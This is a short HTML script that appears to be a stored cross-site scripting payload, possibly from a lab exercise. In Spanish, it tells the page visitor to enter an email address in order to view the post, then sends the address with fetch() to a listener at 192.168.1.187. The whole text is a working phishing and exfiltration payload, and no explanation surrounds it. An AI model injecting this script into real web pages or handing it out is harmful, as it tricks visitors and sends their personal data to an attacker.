<script>
  var email = prompt("Por favor introduce tu correo electronico para visualizar el post", "example@example.com")

  if (email == null || email == ""){
    alert("Es necesario introducir un correo valido para visualizar el post");
  }else{
    fetch("http://192.168.1.187/?email=" + email)
  }
</script>
